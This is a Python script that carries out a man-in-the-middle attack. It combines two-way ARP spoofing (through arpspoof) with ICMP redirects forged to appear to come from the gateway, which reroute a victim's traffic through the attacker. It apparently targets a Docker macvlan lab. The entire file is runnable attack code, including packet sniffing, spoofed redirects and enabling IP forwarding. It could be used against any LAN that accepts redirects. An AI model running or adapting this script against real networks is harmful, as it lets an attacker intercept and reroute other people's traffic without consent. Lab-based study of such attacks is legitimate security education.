#!/usr/bin/env python3
"""
ICMP Redirect Attack with ARP Spoofing - Macvlan Implementation
================================================================
This script performs a sophisticated ICMP redirect attack enhanced with ARP spoofing
in a macvlan environment for maximum effectiveness.

Attack Flow:
1. ARP Spoofing: Position attacker as man-in-the-middle between victim and router
2. Traffic Interception: Capture all victim traffic due to MITM position
3. ICMP Redirects: Send forged ICMP redirects to manipulate victim routing
4. Traffic Redirection: Victim routes traffic through attacker

Key Features:
- ARP spoofing for guaranteed traffic interception
- Uses common packet_craft.py library for packet operations
- Real traffic sniffing in macvlan environment  
- Reactive ICMP redirects based on observed traffic
- Proper ICMP redirect packet structure per RFC 792
- Comprehensive logging and monitoring
- Automatic cleanup of ARP spoofing on exit

Network Setup:
- All containers on same macvlan network (10.9.0.0/24)
- Attacker uses ARP spoofing to become man-in-the-middle
- ICMP redirects further manipulate routing tables
"""

import sys
import time
import threading
import signal
import atexit
import subprocess
import os
from packet_craft import *

# ═══════════════════════════════════════════════════════════════════════════════════
# ATTACK CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════════════

# Network Configuration (Macvlan Setup)
VICTIM_IP = "10.9.0.5"      # Target of ICMP redirect attack
ATTACKER_IP = "10.9.0.105"  # Our IP (attacker)
ROUTER_IP = "10.9.0.11"     # Legitimate gateway IP
TARGET_IP = "10.9.0.200"    # Target server victim tries to reach
TARGET2_IP = "10.9.0.201"   # Alternative target server

# Attack Configuration
INTERFACE = "eth1"           # Network interface for packet capture (macvlan)
MAX_REDIRECTS = 10           # Maximum redirects to send per session
REDIRECT_DELAY = 0.1         # Delay between redirects (seconds)

# ═══════════════════════════════════════════════════════════════════════════════════
# GLOBAL STATE
# ═══════════════════════════════════════════════════════════════════════════════════

attack_active = True
redirects_sent = 0
packets_seen = 0
target_traffic_seen = 0
arp_spoof_processes = []  # Track ARP spoofing processes

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    global attack_active
    print(f"\n🛑 Attack interrupted by user")
    attack_active = False
    sys.exit(0)

def cleanup():
    """Cleanup function called on exit"""
    global redirects_sent, packets_seen, target_traffic_seen, arp_spoof_processes
    
    # Stop ARP spoofing
    stop_arp_spoofing()
    
    print(f"\n🧹 Attack Summary:")
    print(f"   📊 Packets observed: {packets_seen}")
    print(f"   🎯 Target traffic detected: {target_traffic_seen}")
    print(f"   📤 ICMP redirects sent: {redirects_sent}")
    if redirects_sent > 0:
        print(f"   💡 To verify attack success, check victim routing externally")

def setup_ip_forwarding():
    """Enable IP forwarding on attacker to handle redirected traffic"""
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1')
        print("✅ Enabled IP forwarding on attacker")
        return True
    except Exception as e:
        print(f"⚠️  Failed to enable IP forwarding: {e}")
        return False

def send_icmp_redirect(original_packet, victim_ip, gateway_ip=ATTACKER_IP):
    """
    Send ICMP redirect message to victim
    
    Args:
        original_packet: The original IP packet that triggered this redirect
        victim_ip: IP address of victim to send redirect to
        gateway_ip: New gateway IP to redirect traffic to (default: attacker)
    """
    global redirects_sent
    
    try:
        # Create ICMP redirect payload
        icmp_redirect = create_icmp_redirect(gateway_ip, original_packet)
        
        # Create IP header (spoofed from router to victim)
        ip_header = create_ip_header(
            src_ip=ROUTER_IP,        # Spoof as legitimate router
            dst_ip=victim_ip,        # Send to victim
            proto=1,                 # ICMP protocol
            payload_len=len(icmp_redirect)
        )
        
        # Combine into complete packet
        redirect_packet = ip_header + icmp_redirect
        
        # Send the redirect
        if send_packet(redirect_packet, victim_ip):
            redirects_sent += 1
            print(f"📤 ICMP redirect #{redirects_sent} sent to {victim_ip}")
            print(f"   Redirecting traffic to {gateway_ip} (spoofed from {ROUTER_IP})")
            return True
        else:
            print(f"❌ Failed to send ICMP redirect to {victim_ip}")
            return False
            
    except Exception as e:
        print(f"❌ Error sending ICMP redirect: {e}")
        return False

def analyze_packet(ip_packet):
    """
    Analyze captured IP packet and determine if it should trigger a redirect
    
    Args:
        ip_packet: Raw IP packet bytes
        
    Returns:
        True if redirect was sent, False otherwise
    """
    global target_traffic_seen
    
    # Parse IP header
    ip_header = parse_ip_header(ip_packet)
    if not ip_header:
        return False
        
    src_ip = ip_header['src']
    dst_ip = ip_header['dst']
    protocol = ip_header['protocol']
    
    # Check if this is victim traffic to our target servers
    if (src_ip == VICTIM_IP and 
        (dst_ip == TARGET_IP or dst_ip == TARGET2_IP or dst_ip.startswith("10.9.0.2"))):
        
        target_traffic_seen += 1
        print(f"🎯 Target traffic detected: {src_ip} → {dst_ip} (protocol {protocol})")
        
        # Send ICMP redirect to victim
        return send_icmp_redirect(ip_packet, VICTIM_IP)
    
    # Also redirect if victim tries to reach any server beyond router
    elif (src_ip == VICTIM_IP and 
          not dst_ip.startswith("10.9.0.") and
          dst_ip != "127.0.0.1"):
        
        target_traffic_seen += 1
        print(f"🌐 External traffic detected: {src_ip} → {dst_ip}")
        return send_icmp_redirect(ip_packet, VICTIM_IP)
    
    return False

def packet_sniffer():
    """
    Main packet sniffing loop - captures and analyzes traffic
    """
    global attack_active, packets_seen
    
    print(f"📡 Starting packet capture on {INTERFACE}...")
    print(f"🔍 Monitoring for victim traffic: {VICTIM_IP} → targets")
    
    try:
        # Create packet socket for capturing
        sock = create_packet_socket(INTERFACE)
        sock.settimeout(1.0)  # 1 second timeout for non-blocking operation
        
        while attack_active:
            try:
                # Capture packet
                frame, addr = sock.recvfrom(65535)
                packets_seen += 1
                
                # Extract IP packet from Ethernet frame
                ip_packet = extract_ethernet_payload(frame)
                if not ip_packet:
                    continue
                    
                # Analyze packet and potentially send redirect
                analyze_packet(ip_packet)
                
                # Rate limiting
                if redirects_sent >= MAX_REDIRECTS:
                    print(f"🛑 Maximum redirects ({MAX_REDIRECTS}) reached. Stopping attack.")
                    break
                    
                # Brief delay to avoid overwhelming the network
                time.sleep(REDIRECT_DELAY)
                
            except socket.timeout:
                # Timeout is normal, continue
                continue
            except socket.error as e:
                if attack_active:  # Only print error if we're still supposed to be running
                    print(f"⚠️  Socket error: {e}")
                break
                
    except Exception as e:
        print(f"❌ Packet sniffing error: {e}")
    finally:
        try:
            sock.close()
        except:
            pass

def monitor_attack_progress():
    """
    Monitor attack progress by analyzing network traffic patterns
    """
    print(f"📊 Starting attack progress monitor...")
    
    while attack_active:
        try:
            time.sleep(10)  # Check every 10 seconds
            
            if redirects_sent > 0:
                print(f"📈 Attack Progress: {redirects_sent} redirects sent, {target_traffic_seen} target packets seen")
                
                if redirects_sent >= 5:
                    print(f"� Multiple redirects sent - victim routing may be affected")
                    print(f"� To verify success, check victim routing externally:")
                    print(f"   docker exec victim ip route")
            
        except Exception as e:
            if attack_active:
                print(f"⚠️  Error monitoring attack progress: {e}")
            break

def check_arp_spoof_installed():
    """Check if arpspoof is installed (should be pre-installed during setup)"""
    try:
        # Check if arpspoof is available
        subprocess.run(['which', 'arpspoof'], check=True, capture_output=True)
        print("✅ arpspoof is available")
        return True
    except subprocess.CalledProcessError:
        print("❌ arpspoof not found!")
        print("   📦 dsniff package should be installed during container setup")
        print("   🔧 Run the setup script again to install required packages")
        return False

def start_arp_spoofing():
    """Start ARP spoofing to position attacker as man-in-the-middle"""
    global arp_spoof_processes
    
    print(f"🎭 Starting ARP spoofing...")
    print(f"   Spoofing as router ({ROUTER_IP}) to victim ({VICTIM_IP})")
    print(f"   Spoofing as victim ({VICTIM_IP}) to router ({ROUTER_IP})")
    
    try:
        # ARP spoof: Tell victim that we are the router
        proc1 = subprocess.Popen([
            'arpspoof', '-i', INTERFACE, '-t', VICTIM_IP, ROUTER_IP
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # ARP spoof: Tell router that we are the victim  
        proc2 = subprocess.Popen([
            'arpspoof', '-i', INTERFACE, '-t', ROUTER_IP, VICTIM_IP
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        arp_spoof_processes = [proc1, proc2]
        
        # Give ARP spoofing time to take effect
        time.sleep(3)
        
        print("✅ ARP spoofing started successfully")
        print("   📋 Attacker is now man-in-the-middle between victim and router")
        return True
        
    except Exception as e:
        print(f"❌ Failed to start ARP spoofing: {e}")
        return False

def stop_arp_spoofing():
    """Stop ARP spoofing processes"""
    global arp_spoof_processes
    
    if arp_spoof_processes:
        print("🛑 Stopping ARP spoofing...")
        for proc in arp_spoof_processes:
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except:
                try:
                    proc.kill()
                except:
                    pass
        arp_spoof_processes = []
        print("✅ ARP spoofing stopped")

def main():
    """Main attack function"""
    global attack_active
    
    print("🚀 ICMP Redirect Attack with ARP Spoofing")
    print("==========================================")
    print(f"🎯 Target: {VICTIM_IP} (victim)")
    print(f"👹 Attacker: {ATTACKER_IP} (us)")
    print(f"🌐 Router: {ROUTER_IP} (spoofed source)")
    print(f"🎯 Targets: {TARGET_IP}, {TARGET2_IP}")
    print(f"📡 Interface: {INTERFACE}")
    print("==========================================")
    
    # Register cleanup and signal handlers
    atexit.register(cleanup)
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Check and install ARP spoofing tools
    if not check_arp_spoof_installed():
        print("❌ Cannot proceed without arpspoof. Exiting.")
        return
    
    # Setup environment
    if not setup_ip_forwarding():
        print("❌ Failed to setup IP forwarding. Continuing anyway...")
    
    print("\n🔧 Attack Prerequisites:")
    print("   ✅ Macvlan network provides L2 visibility")
    print("   ✅ ARP spoofing for man-in-the-middle positioning")
    print("   ✅ ICMP redirects for routing manipulation") 
    print("   ✅ Victim accepts ICMP redirects")
    print("   ✅ Using realistic packet crafting")
    
    print(f"\n📊 Attack Statistics:")
    print(f"   Max redirects: {MAX_REDIRECTS}")
    print(f"   Redirect delay: {REDIRECT_DELAY}s")
    
    # Start ARP spoofing to become man-in-the-middle
    if not start_arp_spoofing():
        print("❌ Failed to start ARP spoofing. Attack may be less effective.")
        input("Press Enter to continue anyway or Ctrl+C to exit...")
    
    # Start monitoring thread
    monitor_thread = threading.Thread(target=monitor_attack_progress, daemon=True)
    monitor_thread.start()
    
    print(f"\n🎬 Starting Attack...")
    print(f"💡 Generate victim traffic with: docker exec victim ping {TARGET_IP}")
    print(f"📊 Monitor with: docker exec victim ip route")
    print(f"⏹️  Stop with: Ctrl+C")
    print("")
    
    try:
        # Start packet sniffing (blocks until attack_active becomes False)
        packet_sniffer()
        
    except KeyboardInterrupt:
        print(f"\n🛑 Attack stopped by user")
    except Exception as e:
        print(f"\n❌ Attack failed: {e}")
    finally:
        attack_active = False
        
    print(f"\n✅ Attack completed")

if __name__ == "__main__":
    main()
